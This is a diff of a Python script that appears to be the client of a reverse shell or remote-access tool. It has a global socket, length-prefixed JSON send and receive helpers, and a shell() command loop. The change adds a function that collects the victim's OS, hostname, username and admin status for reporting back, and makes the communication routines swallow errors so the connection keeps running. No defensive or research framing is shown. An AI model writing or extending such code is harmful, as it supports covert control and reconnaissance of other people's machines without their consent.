@@ -24,47 +24,75 @@ BUFFER_SIZE = 4096
 # Global socket variable
 s = None
 
-def reliable_send(data):
+def get_system_info():
+    try:
+        import platform
+        import socket
+        import ctypes
+        import os
+
+        # Get OS info
+        os_type = platform.system() + " " + platform.release()
+        hostname = socket.gethostname()
+        username = os.getlogin()
+        
+        # Check for admin privileges
+        try:
+            is_admin = False
+            if platform.system() == 'Windows':
+                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+            else:  # Unix-like systems
+                is_admin = os.getuid() == 0
+        except:
+            is_admin = False
+
+        return {
+            'os': os_type,
+            'hostname': hostname,
+            'username': username,
+            'is_admin': is_admin
+        }
+    except Exception as e:
+        return {
+            'os': 'Unknown',
+            'hostname': 'Unknown',
+            'username': 'Unknown',
+            'is_admin': False,
+            'error': str(e)
+        }
+
+def reliable_send(s, data):
     try:
         json_data = json.dumps(data)
         length = len(json_data)
-        length_header = f"{length:<10}".encode()  # Fixed length header
+        length_header = f"{length:<10}".encode()
         s.send(length_header)
         s.send(json_data.encode())
     except Exception as e:
         print(f"Error sending data: {e}")
-        raise
 
-def reliable_recv():
+def reliable_recv(s):
     try:
-        # First receive the length header
         length_header = s.recv(10).decode().strip()
         if not length_header:
             return None
         
-        # Convert length header to int
         length = int(length_header)
-        
-        # Receive the actual data
         chunks = []
         bytes_received = 0
+        
         while bytes_received < length:
-            chunk = s.recv(min(length - bytes_received, BUFFER_SIZE))
+            chunk = s.recv(min(length - bytes_received, 4096))
             if not chunk:
                 return None
             chunks.append(chunk)
             bytes_received += len(chunk)
         
         data = b''.join(chunks).decode()
-        
-        try:
-            return json.loads(data)
-        except json.JSONDecodeError:
-            return data.strip()
-            
+        return json.loads(data)
     except Exception as e:
         print(f"Error receiving data: {e}")
-        raise
+        return None
 
 def shell():
     while True:
